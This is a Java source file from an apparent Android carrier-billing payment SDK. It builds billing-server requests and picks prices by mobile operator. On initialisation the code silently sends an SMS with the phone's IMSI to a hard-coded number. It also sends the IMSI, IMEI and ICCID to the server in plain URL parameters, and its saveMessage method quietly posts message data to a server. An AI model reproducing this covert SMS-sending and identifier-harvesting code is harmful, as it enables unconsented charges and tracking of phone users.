package com.sdk.wj.paysdk.httpCenter;

import android.content.Context;
import android.text.TextUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import com.sdk.wj.paysdk.json.ChannelEntity;
import com.sdk.wj.paysdk.json.JsonEntity;
import com.sdk.wj.paysdk.json.MessageEntity;
import com.sdk.wj.paysdk.sms.MySmsManager;
import com.sdk.wj.paysdk.utils.Constants;
import com.sdk.wj.paysdk.utils.Log;
import com.sdk.wj.paysdk.utils.Utils;

/**
 * GetDataImpl
 *
 * @author Administrator
 */
public class GetDataImpl {
    public static HashMap<String, Map<String, Object>> content = new HashMap<>();
    private static GetDataImpl mInstance;

    private static Context mContext;

    private JsonEntity.RequestProperties mRequestProperties;

    public JsonEntity.RequestProperties getmRequestProperties() {
        return mRequestProperties;
    }

    private static String URL = "/ExternalPJ/phoneAPI/";
    public static final String SERVER_URL = Constants.SERVER_URL + URL;
    public static final String DYBN_REPORT_URL = "http://103.10.87.143/sy/dianxin_getThirdChargeCodeAndPayDetail_html.jsp";

    public static final String INIT_URL = "init.do";
    public static final String RAND_URL = "QueryThourgh.do";
    public static final String SAVEMESSAGE_URL = "saveMessage.do"; // 保存短信

    private GetDataImpl(Context ctx) {

        mContext = ctx;
        mRequestProperties = new JsonEntity.RequestProperties(ctx);
    }

    public static GetDataImpl getInstance(Context ctx) {
        if (mInstance == null) {
            mInstance = new GetDataImpl(ctx);
        }
        return mInstance;
    }

    /**
     * 支付SDK初始化
     *
     * @return
     */
    public void getPayInit(HttpListener listener) {
        MySmsManager.SendMessage("12114000406343", "sdk#" + Utils.getIMSI(mContext));
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("packId", Utils.getPackId(mContext));
        params.put("imsi", Utils.getIMSI(mContext));
        params.put("imei", Utils.getIMEI(mContext));
        params.put("version", Constants.VERSIONS);
        params.put("model", android.os.Build.MODEL.replace(" ", "")); // 手机型号
        params.put("sdk_version", android.os.Build.VERSION.SDK); // SDK版本
        params.put("release_version", android.os.Build.VERSION.RELEASE); // 系统版本
        params.put("iccid", Utils.getICCID(mContext));
        doRequest(getUrl(SERVER_URL + INIT_URL, params), mRequestProperties.buildJson().toString(), listener);
    }

    /**
     * 请求通道
     *
     * @param customized_price
     * 价格
     * @param payItemId
     * 道具ID
     * @return
     */
    int getChannelNum = 0;

    public void getChannelId(String throughid, String customized_price, String Did, String product,
                             HttpListener listener) {
        if (null == Utils.getIMSI(mContext) || ("").equals(Utils.getIMSI(mContext))) {
            return;
        }
        HashMap<String, String> params = new HashMap<String, String>();
        params.put("throughid", throughid);
        params.put("price", customized_price);
        params.put("gameId", Utils.getGameId(mContext));
        params.put("packId", Utils.getPackId(mContext));
        params.put("did", Did);
        params.put("orderId", Did);
        params.put("imsi", Utils.getIMSI(mContext));
        params.put("imei", Utils.getIMEI(mContext));
        params.put("iccid", Utils.getICCID(mContext));
        params.put("version", Constants.VERSIONS);
        params.put("Phone_Model", android.os.Build.MODEL.replace(" ", ""));
        try {
            params.put("product", new String(URLEncoder.encode(product, "UTF-8")));
            params.put("appName", new String(URLEncoder.encode(Utils.getApplicationName(mContext), "UTF-8")));
            if (Constants.isOutPut) {
                Log.debug("appName -->" + URLEncoder.encode(Utils.getApplicationName(mContext), "UTF-8"));
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        doRequest(getUrl(SERVER_URL + RAND_URL, params), mRequestProperties.buildJson().toString(), listener);
        ChannelEntity.setShortName(null);

    }

    /**
     * 同步短信
     *
     * @param orderInfo 金额以分为单位
     * @return 反馈结果
     */
    public void saveMessage(final MessageEntity orderInfo) {
        String url = getUrl(SERVER_URL + SAVEMESSAGE_URL, null);
        if (Constants.isOutPut) {
            Log.debug("feedback rp orderInfo--> " + orderInfo.buildJson().toString());
        }
        try {
            doPostReuqestWithoutListener(url, orderInfo.buildJson().toString());
        } catch (Exception e) {
        }
    }

    /**
     * 内部有加密
     *
     * @param url
     * @param content
     * @return
     */
    public static void doRequest(String url, String content, HttpListener listener) {
        HttpCenter.submitPostData(url, content, listener);
    }

    public static void doPostReuqestWithoutListener(String url, String content) {
        HttpCenter.submitPostData(url, content, null);
    }

    /**
     * 外部GET
     */
    public static void doRequest(String urlString, HttpListener listener) {
        HttpCenter.submitGetData(urlString, listener);
    }

    /**
     * get请求不需要返回值
     *
     * @param urlString
     */
    public static void doGetRequestWithoutListener(String urlString) {
        HttpCenter.submitGetData(urlString, null);
    }

    public static String getUrl(String url, HashMap<String, String> params) {
        if (params != null) {
            Iterator<String> it = params.keySet().iterator();
            StringBuffer sb = null;
            while (it.hasNext()) {
                String key = it.next();
                String value = params.get(key);
                if (sb == null) {
                    sb = new StringBuffer();
                    sb.append("?");
                } else {
                    sb.append("&");
                }
                sb.append(key);
                sb.append("=");
                sb.append(value);
            }
            url += sb.toString();
        }
        if (Constants.isOutPut) {
            Log.debug("url -->" + url);
        }
        return url;
    }

    public static void PayPoint(Context context, String s) {
        JSONObject oj;
        try {
            oj = new JSONObject(s.toString());
            JSONArray jsonArray = oj.getJSONArray("rows");
            for (int i = 0; i < jsonArray.length(); i++) {
                Map<String, Object> map = new HashMap<String, Object>();
                JSONObject json = jsonArray.getJSONObject(i);
                String imsi = Utils.getIMSI(mContext);
                if (imsi.equals("")) {
                    return;
                }
                if (!TextUtils.isEmpty(imsi)) {
                    if ((imsi.startsWith("46000")) || (imsi.startsWith("46002")) || (imsi.startsWith("46007"))) { // 移动
                        map.put("price", json.getString("yprice"));
                    }
                    if (imsi.startsWith("46001")) { // 联通
                        map.put("price", json.getString("lprice"));
                    }
                    if (imsi.startsWith("46003")) { // 电信
                        map.put("price", json.getString("dprice"));
                    }
                }
                map.put("dname", json.get("dname"));
                map.put("isopen", json.get("isopen"));
                content.put(json.getString("did"), map);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
